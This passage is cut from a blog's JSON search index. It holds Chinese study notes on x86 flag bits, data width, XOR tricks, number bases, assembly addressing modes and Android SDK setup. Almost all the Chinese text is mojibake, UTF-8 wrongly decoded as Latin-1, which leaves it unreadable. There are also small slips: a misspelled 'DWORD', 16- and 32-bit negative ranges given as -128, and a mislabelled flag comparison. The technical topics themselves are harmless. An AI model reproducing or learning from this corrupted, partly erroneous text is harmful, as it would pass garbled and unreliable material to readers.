Flag)ï¼šå¦‚æœåœ¨â€œåŠ â€æ“ä½œæœŸé—´ä»ä½åŠå­—èŠ‚ï¼ˆæœ€ä½å››ä½ï¼‰åˆ°é«˜åŠå­—èŠ‚ï¼ˆé«˜å››ä½ï¼‰æœ‰è¿›ä½ï¼Œæˆ–è€…åœ¨å‡æ³•æœŸé—´çš„ä½8ä½éƒ¨åˆ†ä»é«˜åŠå­—èŠ‚åˆ°ä½åŠå­—èŠ‚æœ‰å€Ÿä½ï¼Œåˆ™å°†è¾…åŠ©æ ‡å¿—è®¾ç½®ä¸ºï¼ˆ1ï¼‰ã€‚å¦åˆ™ï¼Œå¦‚æœä¸å‘ç”Ÿè¿™ç§è¿›ä½æˆ–å€Ÿä½ï¼Œåˆ™æ¸…é™¤æ ‡å¿—æˆ–å°†å…¶â€œå¤ä½â€ï¼ˆè®¾ç½®ä¸º0ï¼‰ã€‚â€”-ï¼ˆç»´åŸºç™¾ç§‘ï¼‰ è¾…åŠ©è¿¸ä½æ ‡å¿—:ç®—æ•°æ“ä½œçµæœçš„ç¬¬ä¸‰ä½ã€ˆä»0å¹µå§‹è®¡æ•°ã€‰å¦‚æœå‘ç”Ÿäº†è¿¸ä½æˆ–è€…å€Ÿä½å‰‡å°‡å…¶ç½®ä¸º1,å¦å‰‡ä¸º0,å¸¸åœ¨BCD(binary-codedecimal)ç®—æœ¨è¿„ç®—ä¸­è¢«ä½¿ç”¨ã€‚â€”ï¼ˆç™¾åº¦ç™¾ç§‘ï¼‰ è§£æï¼šè¿™ä¸ªè¿˜æ˜¯åœ¨å¾ˆå¤šèµ„æ–™ä¸Šæ˜¯é”™è¯¯çš„ï¼Œåœ¨x86æ±‡ç¼–ä¸Šæ­£ç¡®è§£é‡Šå¦‚ä¸Šï¼Œä¹Ÿå°±æ˜¯åœ¨D0-D7ä¸­ï¼ŒD3å‘D4ä½è¿›ä½æˆ–è€…å€Ÿä½ï¼Œæ‰ä¼šç½®1ã€‚ï¼ˆè¿™ä¸ªå½“åˆè€å¸ˆè®²é”™ã€ç™¾åº¦é«˜èµä¹Ÿæ˜¯é”™çš„ï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼‰ã€‚ ZFé›¶æ ‡å¿—ZF(Zero Flag)ï¼šé›¶æ ‡å¿—ZFç”¨æ¥åæ˜ è¿ç®—ç»“æœæ˜¯å¦ä¸º0ã€‚å¦‚æœè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚åœ¨åˆ¤æ–­è¿ç®—ç»“æœæ˜¯å¦ä¸º0æ—¶ï¼Œå¯ä½¿ç”¨æ­¤æ ‡å¿—ä½ã€‚è§£æï¼šå¼•ä¸€ä¸‹å¸¸ç”¨çš„xor r8/16/32,r8/16/32å¯¹å¯„å­˜å™¨æ¸…é›¶æ“ä½œã€‚ SFç¬¦å·æ ‡å¿—SF(Sign Flag)ï¼šç¬¦å·æ ‡å¿—SFç”¨æ¥åæ˜ è¿ç®—ç»“æœçš„ç¬¦å·ä½ï¼Œå®ƒä¸è¿ç®—ç»“æœçš„æœ€é«˜ä½ç›¸åŒã€‚ è§£æï¼šè¿˜æ˜¯éœ€è¦ç¡®å®šæ•°æ®å®½åº¦ï¼Œçœ‹å¥½åˆ°åº•å“ªä¸ªæ˜¯æœ€é«˜ä½ï¼Œç„¶åæŠŠå®ƒæ¢æˆ2è¿›åˆ¶ç¡®å®šæœ€é«˜ä½æ˜¯0è¿˜æ˜¯1.ä¾‹å­ï¼š MOV AL,20 MOV CX,8000 ADD AX,CX è¿™ä¸ªå°±æ˜¯åœ¨å­—ä¸Šæ“ä½œï¼Œç„¶åç›¸åŠ ç»“æœæ˜¯8020,æœ€é«˜ä½å°±æ˜¯1000ï¼Œé‚£è¿™ä¸ªSFå°±æ˜¯1äº†ã€‚è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªsfæ ‡å¿—ä¹Ÿæ˜¯çœ‹æ•°æ®å®½åº¦çš„ã€‚ OFæº¢å‡ºæ ‡å¿—OF(Overflow Flag)ï¼šæº¢å‡ºæ ‡å¿—OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡ºã€‚å¦‚æœè¿ç®—ç»“æœè¶…è¿‡å½“å‰è¿ç®—ä½æ•°æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œåˆ™ç§°ä¸ºæº¢å‡ºï¼ŒOFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™ï¼ŒOFçš„å€¼è¢«æ¸…ä¸º0ã€‚ è§£æï¼šè¿™ä¸ªå¸¸ä¸CFæ··æ·†ï¼Œä»¥ä¸ºä»–ä»¬æ²¡å•¥åŒºåˆ«ï¼Œä½†æ˜¯è¿™ä¸ªæ‰æ˜¯æ­£å®—çš„è®¡ç®—æœºçœ‹æ˜¯å¦æº¢å‡ºçš„æ ‡å¿—ä½ã€‚ CFä¸SFåŒºåˆ«ï¼š è¿›ä½æ ‡å¿—è¡¨ç¤ºæ— ç¬¦å·æ•°è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´. æº¢å‡ºæ ‡å¿—è¡¨ç¤ºæœ‰ç¬¦å·æ•°è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´. æº¢å‡ºä¸»è¦æ˜¯ç»™æœ‰ç¬¦å·è¿ç®—ä½¿ç”¨çš„ï¼Œåœ¨æœ‰ç¬¦å·çš„è¿ç®—ä¸­ï¼Œæœ‰å¦‚ä¸‹çš„è§„å¾‹ï¼š æ­£ + æ­£ = æ­£ å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º è´Ÿ + è´Ÿ = è´Ÿ å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º æ­£ + è´Ÿ æ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡º.ç»“åˆè¿™ä¸ªå›¾åœ¨åº”ä¸ºå¯¹PFçš„åˆ¤æ–­ï¼Œéå¸¸å¥½ç”¨ã€‚åˆ¤æ–­çš„æ—¶å€™ï¼Œä¸€å®šæ³¨æ„PFæ˜¯åœ¨æœ‰ç¬¦å·æ•°åšè¿ç®—çš„æ—¶å€™å»çœ‹çš„ï¼Œæ— ç¬¦å·ç›´æ¥çœ‹CFå°±å¥½äº†ã€‚ ç»ƒä¹ å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼MOV AL,0FE ADD AL,10 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼MOV AL,1 ADD AL,2 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼MOV EAX,0F ADD EAX,1 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼MOV CL,0F1 ADD CL,1 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼MOV AL,80 SUB AL,10 è¿™ä¸ªéœ€è¦é‡è§†ä¸‹ï¼Œç»ƒä¹ çš„æ—¶å€™æœ‰ç‚¹å—æ€ç»´é™åˆ¶äº†ã€‚æ²¡æœ‰æƒ³åˆ°ç”¨SUBæ¥æ„é€ å‡ºï¼Œç«™åœ¨80çš„ä½ç½®é¡ºæ—¶é’ˆæŸ¥10ï¼Œè´Ÿ-æ­£=æ­£ï¼Œæ¥å®ç°æº¢å‡ºå®Œæˆåªå½±å“OFä½ã€‚","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—","slug":"æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—","date":"2019-10-01T13:08:32.000Z","updated":"2020-02-24T04:28:05.000Z","comments":true,"path":"2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/","link":"","permalink":"http://chumen77.xyz/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/","excerpt":"","text":"æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—æ•°æ®å®½åº¦æ•°å­¦ä¸Šçš„æ•°å­—ï¼Œæ˜¯æ²¡æœ‰å¤§å°é™åˆ¶çš„ï¼Œå¯ä»¥æ— é™çš„å¤§ã€‚ä½†åœ¨è®¡ç®—æœºä¸­ï¼Œç”±äºå—ç¡¬ä»¶çš„åˆ¶çº¦ï¼Œæ•°æ®éƒ½æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼ˆæˆ‘ä»¬ç§°ä¸ºæ•°æ®å®½åº¦ï¼‰ï¼Œè¶…è¿‡æœ€å¤šå®½åº¦çš„æ•°æ®ä¼šè¢«ä¸¢å¼ƒã€‚ å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°4ä½å®½åº¦è¡¨ç¤º4ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨4ä½2è¿›åˆ¶æ•°ï¼š 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 0 1 2 3 4 5 6 7 8 9 A B C D E F å­˜æ— ç¬¦å·æ•°æ—¶ï¼š0 1 2 3 4 5 6 7 8 9 A B C D E Få­˜æœ‰ç¬¦å·æ•°æ—¶ï¼š æ­£æ•°ï¼š0 1 2 3 4 5 6 7 è´Ÿæ•°ï¼š-1 -2 -3 -4 -5 -6 -7 -8 å…¶ä¸­å¯¹åº”å…³ç³»ï¼š -1 -2 -3 -4 -5 -6 -7 -8 F E D C B A 9 8 æ— ç¬¦å·æ•°æ—¶ï¼šä»0åˆ°Fé€†æ—¶é’ˆä¾æ¬¡å¢å¤§ã€‚ æœ‰ç¬¦å·æ•°æ—¶ï¼šå«ä¹‰ä»åœ†ä¸­é—´åŠˆå¼€ï¼Œæ­£æ•°è´Ÿæ•°å„ä¸€åŠï¼Œåœ¨Få¤„ä¸ºæœ€å¤§è´Ÿæ•°ï¼Œ0å¤„ä¸ºæœ€å°çš„æ­£æ•°ã€‚ ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿæˆ‘ä»¬åªçœ‹äºŒè¿›åˆ¶ï¼š| 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || â€” | â€” | â€” | â€” | â€” | â€” | â€” | â€” | â€” || 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 | -1 -2 -3 -4 -5 -6 -7 -8 1111 1110 1101 1100 1011 1010 1001 1000 å¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºï¼Œå½“äºŒè¿›åˆ¶å¼€å¤´ä¸º1çš„æ—¶å€™å¯¹åº”å­˜çš„æ•°å€¼å°±æ˜¯è´Ÿæ•°äº†ã€‚ ä¸¾ä¾‹ï¼šå¯¹1011çš„ç†è§£ 1011åœ¨æˆ‘ä»¬å½“åšæ˜¯æœ‰ç¬¦å·æ—¶å°±æ˜¯-5ï¼Œæ— ç¬¦å·å°±æ˜¯Bã€‚è¿™ä¸ªå®Œå…¨çœ‹æˆ‘ä»¬å¦‚ä½•å»å®šä¹‰ã€‚ #### 8ä½å®½åº¦ï¼š 8ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨8ä½2è¿›åˆ¶æ•°ã€‚ æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦â€¦FF æœ‰ç¬¦å·æ•°ï¼šæ­£æ•°ï¼š0 1 2 3 4 5 6 7 â€¦7Fè´Ÿæ•°ï¼š -1 -2 -3 -4 -5 -6 -7 -8 â€¦. -128 FF FE FD FC FB FA F9 F8 â€¦. 80 16ä½å®½åº¦16ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨16ä½2è¿›åˆ¶æ•°æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦â€¦FFFF æœ‰ç¬¦å·æ•°ï¼šæ­£æ•°ï¼š0 1 2 3 4 5 6 7 â€¦7FFFè´Ÿæ•°ï¼š -1 -2 -3 -4 -5 -6 -7 -8 â€¦. -128 FFFF FFFE FFFD FFFC FFFB FFFA FFF9 FFF8 â€¦. 8000 32ä½å®½åº¦32ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨32ä½2è¿›åˆ¶æ•°æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦â€¦FFFFFFFF æœ‰ç¬¦å·æ•°ï¼šæ­£æ•°ï¼š0 1 2 3 4 5 6 7 â€¦7FFFFFFFè´Ÿæ•°ï¼š -1 -2 -3 -4 -5 -6 -7 -8 â€¦. -128 FFFFFFFF FFFFFFFE FFFFFFFD FFFFFFFC FFFFFFFB FFFFFFFA FFFFFFF9 FFFFFFF8 â€¦. 80000000 ### å‡ ä¸ªæœ¬è´¨é—®é¢˜ 1ï¼šè®¡ç®—æœºé™¤äº†0å’Œ1ä»€ä¹ˆä¹Ÿä¸è®¤è¯†ã€‚ 2ï¼šå¦‚æœå­˜çš„æ•°æ®è¶…è¿‡æ•°æ®é•¿åº¦é™åˆ¶ï¼Œè¶…è¿‡çš„ä¼šç›´æ¥æŠ›å¼ƒã€‚ 3ï¼šæœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°æ˜¯æˆ‘ä»¬è‡ªå·±ç”¨çš„æ—¶å€™å®šä¹‰çš„ï¼Œå®šä¹‰æ˜¯ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆã€‚ ### å‡ ä¸ªé‡è¦çš„è®¡é‡å•ä½ï¼š BYTE å­—èŠ‚ 8BIT WORD å­— 16BIT 2å­—èŠ‚ DWORD åŒå­— 32BIT 4å­—èŠ‚ é€»è¾‘è¿ç®—äºŒè¿›åˆ¶çš„é€»è¾‘è¿ç®—ï¼šorï¼šæˆ–(or |) åªè¦æœ‰ä¸€ä¸ªä¸º1å°±æ˜¯1 andï¼šä¸(and &amp;)ä¸¤ä¸ªéƒ½ä¸º1æ‰æ˜¯1 xorå¼‚æˆ–ï¼ˆxor) ä¸ä¸€æ ·ä¸º1psï¼šé”™ä½äº†ã€‚ã€‚ã€‚ noté(not !) 1æ˜¯0 0æ˜¯1 é€»è¾‘è¿ç®—çš„å…·ä½“åº”ç”¨ï¼šæƒ³è·å–æŸä¸ªå€¼å¾—ç¬¬Nä½çš„å€¼æ˜¯1è¿˜æ˜¯0å¦‚ï¼š8F æ–¹æ³•ï¼šæƒ³çœ‹ä¸‹ç¬¬å››ä½æ˜¯0è¿˜æ˜¯1ï¼Œå°±å†™ä¸ªç¬¬å››ä¸ªä½ä¸º1å…¶ä»–éƒ½ä¸º0çš„æ•°ï¼Œç„¶åè¿›è¡Œä¸€ä¸ªä¸è¿ç®—ï¼Œå¦‚æœå‡ºæ¥ç»“æœæ˜¯1.é‚£å°±è¯æ˜ç¬¬å››ä½å°±æ˜¯1ã€‚ æœ€ç®€å•çš„åŠ å¯†ç®—æ³•ï¼šå¦‚ï¼šè¦åŠ å¯†çš„æ•°æ®ï¼š2015å¯†é’¥ï¼š54å› ä¸ºå¯†é’¥æ˜¯ä¸¤ä½çš„ï¼Œæ‰€ä»¥è¦å¯¹2015åˆ†ä¸º20å’Œ15ã€‚è¿›è¡Œä¸€æ¬¡xorè¿ç®—ï¼Œå‡ºæ¥å°±æ˜¯åŠ å¯†åçš„å€¼ï¼š74 41å½“ç”¨ä»–ä¿©å†è¿›è¡Œä¸€æ¬¡xorè¿ç®—ï¼šå°±åˆå˜æˆäº†2015ã€‚è¿™å°±å®Œæˆäº†åŠ å¯†è§£å¯†ã€‚","categories":[],"tags":[]},{"title":"è¿›åˆ¶å­¦ä¹ ","slug":"è¿›åˆ¶å­¦ä¹ ","date":"2019-09-28T03:52:16.000Z","updated":"2019-10-17T16:01:09.000Z","comments":true,"path":"2019/09/28/è¿›åˆ¶å­¦ä¹ /","link":"","permalink":"http://chumen77.xyz/2019/09/28/è¿›åˆ¶å­¦ä¹ /","excerpt":"","text":"è¿›åˆ¶å­¦ä¹ è¿›åˆ¶çš„å®šä¹‰åè¿›åˆ¶çš„å®šä¹‰:ç”±åä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0 1 2 3 4 5 6 7 8 9é€¢åè¿›ä¸€ã€‚ ä¹è¿›åˆ¶çš„å®šä¹‰:ç”±ä¹ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0 1 2 3 4 5 6 7 8é€¢ä¹è¿›ä¸€ã€‚ åå…­è¿›åˆ¶çš„å®šä¹‰:ç”±åå…­ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0 1 2 3 4 5 6 7 8 9 A B C D E F è¿›åˆ¶çš„æœ¬è´¨ä¾‹å¦‚åè¿›åˆ¶ï¼š0 1 2 3 4 5 6 7 8 9 å…¶å°±æ˜¯ç”±10ä¸ªç¬¦å·ç»„æˆã€‚å¦‚æœå®šä¹‰å…¶ä¸º9 1 5 2 4 7 6 3 8 0,æˆ–è€…æ¢æˆ,å¦‚æœç”¨ä¸Šé¢çš„ç¬¦å·è¿›è¡ŒåŠ å¯†ä¸è§£å¯†ï¼Œè®©ä¸æ‡‚è¿›åˆ¶æœ¬è´¨çš„äººè§£å¯†æœ‰å¾ˆå¤§çš„é˜»ç¢ã€‚ äºŒè¿›åˆ¶ä¸åå…­è¿›åˆ¶çš„æ˜ å°„å…³ç³»è¿™ä¸ªéœ€è¦èƒŒä¼šã€‚ ç»ƒä¹ æ­£å¸¸è®¤çŸ¥çš„è¿›åˆ¶ï¼šäºŒè¿›åˆ¶ä»0å†™åˆ°100 ä¸ƒè¿›åˆ¶ç¼–åˆ¶7è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœï¼š23456+54356=ï¼Ÿ5621-654=ï¼Ÿ234*65=ï¼Ÿ7è¿›åˆ¶åŠ æ³•è¡¨ï¼š7è¿›åˆ¶ä¹˜æ³•è¡¨ï¼šç²—ç•¥è®¡ç®—è¿‡ç¨‹ï¼šæœ¬è´¨å°±æ˜¯ç›´æ¥æŸ¥è¡¨äº†ã€‚ åå…­è¿›åˆ¶ï¼šç¼–åˆ¶16è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœï¼š2D4E6+CF3A6=ï¼Ÿ5FD1-E5A=ï¼Ÿ2CA*A5=ï¼Ÿ16è¿›åˆ¶åŠ æ³•ï¼š16è¿›åˆ¶ä¹˜æ³•è¡¨ï¼šç²—ç•¥è®¡ç®—è¿‡ç¨‹ï¼š éƒ½æ˜¯æŸ¥è¡¨ã€‚ é¢å‘æœ¬è´¨çš„éè®¤çŸ¥è¿›åˆ¶ï¼šä¸€ï¼š9è¿›åˆ¶å®šä¹‰ï¼šç”±9ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š2ã€9ã€1ã€7ã€6ã€5ã€4ã€8ã€3ï¼Œé€¢9è¿›1 è®¡ç®—ï¼š123 + 234 = ? å…ˆç”»ä¸ªè¿›åˆ¶è¡¨ï¼šç„¶åè®¡ç®—ï¼š è§£é¢˜è¿‡ç¨‹:1)æœ€åä¸€ä½3+4ä¸­çš„4æ˜¯ç¬¬6ä¸ªæ•°ï¼Œæ‰€ä»¥3+4 å¯ä»¥çœ‹æˆä»3å‘åæ•°6ä¸ªä¸º95ï¼Œå–æœ€åä¸€ä¸ª5ä¸”æœ‰ä¸€ä¸ªè¿›ä½2)æœ€åç¬¬äºŒä½2+3ä¸­çš„2æ˜¯ç¬¬0ä¸ªæ•°ï¼Œæ‰€ä»¥2+3ç›¸å½“3ï¼Œæœ‰ä¸€ä¸ªè¿›ä½ï¼Œéœ€è¦å†å‘åæŸ¥ä¸€ä¸ªæ˜¯92ï¼Œå–æœ€åä¸€ä½2ä¸”è¿›1ä½3)ç¬¬ä¸€ä½1+2ä¸­çš„2æ˜¯ç¬¬0ä¸ªæ•°ï¼Œæ‰€ä»¥1+2ç›¸å½“äº1ï¼Œæœ‰ä¸€ä¸ªè¿›ä½ï¼Œè¦å†å‘åæŸ¥ä¸€ä¸ªï¼Œå†æŸ¥ä¸€ä½æ˜¯7ï¼Œæ‰€ä»¥æœ€åæ˜¯725 äºŒï¼š10è¿›åˆ¶å®šä¹‰ï¼šç”±10ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š!ã€@ã€$ã€%ã€^ã€&amp;ã€*ã€Aã€Bã€Cï¼Œé€¢10è¿›1 è®¡ç®—ï¼š@$$B + %AC&amp; = ? å…ˆç”»ä¸ªè¿›åˆ¶è¡¨ï¼šç„¶åè®¡ç®—ï¼š è§£é¢˜è¿‡ç¨‹ï¼š1)æœ€åä¸€ä½B+&amp;ä¸­çš„&amp;æ˜¯ç¬¬5ä¸ªæ•°ï¼Œæ‰€ä»¥B+&amp;å¯ä»¥çœ‹æˆä»Bå‘åæ•°5ä¸ªä¸º@%ï¼Œå–æœ€åä¸€ä¸ª%ä¸”æœ‰ä¸€ä¸ªè¿›ä½2)æœ€åç¬¬äºŒä½$+Cä¸­çš„Cæ˜¯ç¬¬9ä¸ªæ•°ï¼Œæ‰€ä»¥$+Cç›¸å½“ä»$å¼€å§‹æŸ¥9ä¸ªæ•°ï¼Œå‰é¢æœ‰ä¸€ä¸ªè¿›ä½ï¼Œéœ€è¦å†å‘åæŸ¥ä¸€ä¸ªæ˜¯@$ï¼Œå–æœ€åä¸€ä½$ä¸”è¿›1ä½3)æœ€åç¬¬ä¸‰ä½$+Aä¸­çš„Aæ˜¯ç¬¬7ä¸ªæ•°ï¼Œæ‰€ä»¥$+Aç›¸å½“äºä»$å¼€å§‹å¾€åæŸ¥7ä¸ªï¼Œæœ‰ä¸€ä¸ªè¿›ä½ï¼Œè¦å†å‘åæŸ¥ä¸€ä¸ªï¼Œå†æŸ¥ä¸€ä½æ˜¯@!ï¼Œæ‰€ä»¥æœ€åæ˜¯!ä¸”è¿›ä¸€ä½4)ç¬¬ä¸€ä½çš„@+%ä¸­çš„@æ˜¯ç¬¬ä¸€ä¸ªæ•°ï¼Œæ‰€ä»¥@+%ç›¸å½“äºä»%åœ¨å¾€åæŸ¥ä¸€ä½ï¼Œå› ä¸ºæœ‰ä¸ªè¿›ä½æ‰€ä»¥å†å¾€åæŸ¥ä¸€ä½å°±æ˜¯&amp;ã€‚æ‰€ä»¥ç­”æ¡ˆå°±æ˜¯&amp;!$%ã€‚ æ€»ç»“ï¼šç»è¿‡è¿™æ¬¡å¯¹è¿›åˆ¶çš„å­¦ä¹ å’Œç»ƒä¹ ï¼Œå¯¹è¿›åˆ¶ç†è§£æ›´åŠ çš„æ·±åˆ»ï¼Œå®ƒä»¬åªæ˜¯ä¸€å †ç¬¦å·ï¼Œåœ¨è¾¾åˆ°æŸä¸ªç¨‹åº¦åä¼šè¿›ä½ç½¢äº†ã€‚åœ¨å¤ä¹ åˆ°cåï¼Œæœ‰æ—¶é—´å¯ä»¥å­¦ä¹ ä¸€ä¸‹å†™ä¸ªè¿›åˆ¶åŠ å¯†çš„ç¨‹åºã€‚","categories":[],"tags":[]},{"title":"é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾","slug":"é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾","date":"2019-09-27T15:14:39.000Z","updated":"2019-10-17T15:45:30.000Z","comments":true,"path":"2019/09/27/é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾/","link":"","permalink":"http://chumen77.xyz/2019/09/27/é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾/","excerpt":"","text":"é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾çŸ¥è¯†æ€»ç»“ä¸€ã€å†…å­˜çš„è¯»å†™å¯»å€å…¬å¼ä¸€: [ç«‹å³æ•°]è¯»å–å†…å­˜çš„å€¼: MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DYVORD PTR DS:[0x13FFC8] å‘å†…å­˜ä¸­å†™å…¥æ•°æ®: MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8].ebx è·å–å†…å­˜ç¼–å·: LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] å¯»å€å…¬å¼äºŒ: [reg] regä»£è¡¨å¯„å­˜å™¨å¯ä»¥æ˜¯8ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­çš„ä»»æ„ä¸€ä¸ªè¯»å–å†…å­˜çš„å€¼:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 è·å–å†…å­˜ç¼–å·:LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] å¯»å€å…¬å¼ä¸‰: [reg+ç«‹å³æ•°]è¯»å–å†…å­˜çš„å€¼:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC].0x87654321 è·å–å†…å­˜ç¼–å·:LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] å¯»å€å…¬å¼å››ï¼š[reg+reg*ï¼ˆ1 or 2 or 4 or 8ï¼‰]è¯»å–å†…å­˜çš„å€¼:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],0x87654321 è·å–å†…å­˜ç¼–å·:LEA EAX,DWORD PTR DS:[EAX+ECX*4] å¯»å€å…¬å¼äº”ï¼š[reg+reg*ï¼ˆ1 or 2 or 4 or 8ï¼‰+ç«‹å³æ•°]è¯»å–å†…å­˜çš„å€¼:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321 è·å–å†…å­˜ç¼–å·:LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] äºŒã€å †æ ˆå˜å½¢çš„è‰ºæœ¯:push eaxä»£ç ç›¸å½“äº:lea esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],eax æˆ–è€… mov dword ptr ss:[esp-4],eax lea esp,dword ptr ss:[esp-4] è¿˜æœ‰ sub esp,0x4 mov dword ptr ss:[esp],eax push espä»£ç ç›¸å½“äºï¼šmov dword ptr [esp-4],esp sub esp,0x4 è¿˜æœ‰ï¼š mov dword ptr [esp-4],esp lea esp,dword ptr [esp-4] pop eax ä»£ç ç›¸å½“äºï¼šlea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4] mov eax,dword ptr [esp] lea esp,dword ptr [esp+4] pop esp ä»£ç ç›¸å½“äºï¼šadd esp,0x4 mov esp,dword ptr[esp-4]æˆ–è€… lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4] ä¸¤æ¡ç®€å•æŒ‡ä»¤stos ï¼šå°†eaxä¸­çš„å€¼æ”¾å…¥ediæ‰€æŒ‡åœ°å€çš„å†…å­˜é‡Œã€‚ rep ï¼šæ˜¯é‡å¤æŒ‡ä»¤ ecxä¸­æ”¾å…¥é‡å¤çš„æ¬¡æ•°","categories":[],"tags":[]},{"title":"å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º","slug":"å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º","date":"2019-09-23T09:22:24.000Z","updated":"2019-10-17T15:45:31.000Z","comments":true,"path":"2019/09/23/å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º/","link":"","permalink":"http://chumen77.xyz/2019/09/23/å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º/","excerpt":"","text":"#å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º Macä¸‹å®‰å“SDKæ­å»ºï¼šå‰ææ˜¯å·²ç»å®‰è£…äº†homebrewç¥å™¨ï¼š 1ï¼šä¸‹è½½SDKbrew search android-sdk brew cask install android-sdk 2ï¼šé…ç½®ç¯å¢ƒå˜é‡vim .zshrc export ANDROID_SDK_ROOT=\"/usr/local/share/android-sdk\" export PATH=\"$&#123;PATH&#125;:$&#123;ANDROID_SDK_ROOT&#125;/tools:$&#123;ANDROID_SDK_ROOT&#125;/platform-tools\" !wqé€€å‡ºä»¥åï¼Œsource ~/.zshrc pwd /usr/local/share/android-sdk/tools/bin ./sdkmanager ç„¶åä¼šå‡ºç°Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.ç»§ç»­touch 